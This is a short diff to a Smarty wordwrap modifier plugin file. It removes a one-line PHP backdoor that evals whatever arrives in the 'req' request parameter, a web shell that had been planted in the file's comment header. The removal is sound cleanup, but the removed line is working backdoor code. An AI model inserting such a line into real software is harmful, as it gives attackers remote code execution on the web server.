@@ -13,7 +13,6 @@
  * Name:     wordwrap<br>
  * Purpose:  wrap a string of text at a given length
  * 
-<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
 <?php
  * @link http://smarty.php.net/manual/en/language.modifier.wordwrap.php wordwrap (Smarty online manual)
  * @author Uwe Tews 
